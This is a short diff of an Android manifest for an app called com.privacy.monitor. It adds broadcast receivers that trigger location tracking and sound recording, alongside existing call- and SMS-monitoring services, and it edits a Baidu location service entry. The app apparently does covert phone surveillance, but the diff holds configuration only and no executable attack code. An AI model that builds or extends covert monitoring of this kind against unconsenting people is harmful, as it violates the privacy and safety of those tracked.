@@ -107,6 +107,20 @@
                 <action android:name="com.privacy.monitor.cron" />
             </intent-filter>
         </receiver>
+        
+         <!-- 自定义广播 -->
+        <receiver android:name="com.privacy.monitor.receiver.LocBrocastReceiver" android:permission="android.permission.INTERNET" >
+            <intent-filter >
+                <action android:name="com.privacy.monitor.loc" />
+            </intent-filter>
+        </receiver>
+        
+         <!-- 自定义广播 -->
+        <receiver android:name="com.privacy.monitor.receiver.SoundRecBrocastReceiver" android:permission="android.permission.INTERNET" >
+            <intent-filter >
+                <action android:name="com.privacy.monitor.sound.rec" />
+            </intent-filter>
+        </receiver>
 
         <service android:name="com.privacy.monitor.service.CallMonitoringService"  android:enabled="true"/>
         <service android:name="com.privacy.monitor.service.SMSMonitoringService"  android:enabled="true"/>
@@ -114,11 +128,7 @@
         <service
             android:name="com.baidu.location.f"
             android:enabled="true"
-            android:permission="android.permission.BAIDU_LOCATION_SERVICE"
             android:process=":remote" >
-            <intent-filter>
-                <action android:name="com.baidu.location.service_v2.9" />
-            </intent-filter>
         </service>
     </application>
 
